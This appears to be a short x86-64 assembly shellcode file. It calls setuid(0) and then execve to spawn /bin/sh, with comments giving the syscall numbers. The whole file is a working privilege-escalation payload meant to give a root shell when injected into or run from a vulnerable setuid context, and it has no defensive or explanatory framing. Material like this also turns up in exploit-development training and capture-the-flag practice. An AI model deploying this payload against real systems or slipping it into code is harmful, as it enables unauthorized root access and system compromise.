.global _start 
_start:
.intel_syntax noprefix

        # setuid(uid_t uid);
	# rax	System Call	 rdi
	# 105	sys_setuid	 uid_t uid

	mov rax, 105 # sys_setuid
	mov rdi, 0 # become uid 0 
	syscall 


	# execve(const char *pathname, char *const argv[], char *const envp[]);
        # rax	System Call	   rdi	                 rsi	             rdx
        # 59	sys_execve	   const char* filename	 const char* argv[]	 const char* envp[]

        mov rax, 59 # sys_execve
        mov rsi, 0  # argv is null
        mov rdx, 0  # envp is null
        lea rdi, [rip+bintext] 
        syscall


        # exit(int status);
        # rax	System Call	 rdi
        # 60	sys_exit	 int error_code

        mov rax, 60 # sys_exit
        mov rdi, 0 # exit code
        syscall


bintext:
	.string "/bin/sh"
